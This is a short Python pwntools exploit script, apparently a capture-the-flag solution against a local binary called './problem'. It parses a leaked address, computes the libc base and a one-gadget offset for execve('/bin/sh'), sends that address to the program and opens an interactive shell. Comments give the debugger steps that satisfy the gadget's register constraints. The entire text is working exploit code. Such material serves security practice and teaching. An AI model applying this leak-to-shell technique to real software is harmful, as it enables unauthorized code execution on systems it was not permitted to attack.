#!/usr/bin/python3 

# 0xe3cf3 execve("/bin/sh", r10, r12)
# constraints:
#   [r10] == NULL || r10 == NULL
#   [r12] == NULL || r12 == NULL

# after run exploit debugger starts.
# type fin command before main
# run "set $r10=0" "set $r12=0" "c" (because of constraint of one gadget)
# then you get a shell!
from pwn import *

context.log_level = 'debug'
p = process("./problem")
elf = ELF("./problem")
one_gadget = [0xe6e73, 0xe6e76,0xe6e79]

p.recvuntil("u:")
addr = int(p.recv(14), 16)
log.info("addr: "+ hex(addr))

libcBase = addr-0x3fe10
log.info("libcBase: " + hex(libcBase))
oneshot = addr -  0x64e10 + one_gadget[0]
log.info("oneshot: " + hex(oneshot))

gdb.attach(p)
p.sendlineafter("your one gadget:", str(oneshot))

p.interactive()
